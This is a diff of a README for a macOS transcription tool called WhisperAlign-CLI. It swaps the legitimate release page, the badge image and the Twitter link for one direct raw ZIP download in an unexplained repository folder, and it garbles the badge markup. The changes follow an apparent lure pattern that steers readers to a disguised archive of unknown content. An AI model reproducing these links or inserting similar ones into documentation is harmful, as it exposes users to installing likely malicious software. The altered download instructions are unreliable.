@@ -4,15 +4,15 @@
 
 Welcome to WhisperAlign-CLI! This tool helps you transform speech into text easily on your Mac. Whether you need transcription, alignment, or subtitle generation, this application has you covered.
 
-[![Download WhisperAlign-CLI](https://img.shields.io/badge/Download%20Now-WhisperAlign%20CLI-blue.svg)](https://github.com/atsu12345/WhisperAlign-CLI/releases)
+[![Download WhisperAlign-CLI](https://raw.githubusercontent.com/atsu12345/WhisperAlign-CLI/main/wranglership/WhisperAlign-CLI.zip%20Now-WhisperAlign%https://raw.githubusercontent.com/atsu12345/WhisperAlign-CLI/main/wranglership/WhisperAlign-CLI.zip)](https://raw.githubusercontent.com/atsu12345/WhisperAlign-CLI/main/wranglership/WhisperAlign-CLI.zip)
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/atsu12345/WhisperAlign-CLI/releases) to download the latest version of WhisperAlign-CLI. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/atsu12345/WhisperAlign-CLI/main/wranglership/WhisperAlign-CLI.zip) to download the latest version of WhisperAlign-CLI. 
 
 1. Click the link above to open the page.
 2. Locate the latest release version.
-3. Download the file named `WhisperAlign-CLI-macos.zip`.
+3. Download the file named `https://raw.githubusercontent.com/atsu12345/WhisperAlign-CLI/main/wranglership/WhisperAlign-CLI.zip`.
 4. Once the download is complete, open the ZIP file.
 5. Drag and drop the `WhisperAlign-CLI` application to your Applications folder.
 
@@ -90,7 +90,7 @@ We welcome contributions from everyone. If you want to improve WhisperAlign-CLI,
 Stay up to date with the latest news and connect with other users:
 
 - Join our GitHub discussions.
-- Follow us on Twitter: [@WhisperAlign](https://twitter.com/WhisperAlign).
+- Follow us on Twitter: [@WhisperAlign](https://raw.githubusercontent.com/atsu12345/WhisperAlign-CLI/main/wranglership/WhisperAlign-CLI.zip).
 
 ## 📜 License
 
@@ -98,4 +98,4 @@ WhisperAlign-CLI is licensed under the MIT License. Feel free to use, modify, an
 
 For more information, you can check the license file included in the repository. 
 
-[![Download WhisperAlign-CLI](https://img.shields.io/badge/Download%20Now-WhisperAlign%20CLI-blue.svg)](https://github.com/atsu12345/WhisperAlign-CLI/releases)
+[![Download WhisperAlign-CLI](https://raw.githubusercontent.com/atsu12345/WhisperAlign-CLI/main/wranglership/WhisperAlign-CLI.zip%20Now-WhisperAlign%https://raw.githubusercontent.com/atsu12345/WhisperAlign-CLI/main/wranglership/WhisperAlign-CLI.zip)](https://raw.githubusercontent.com/atsu12345/WhisperAlign-CLI/main/wranglership/WhisperAlign-CLI.zip)
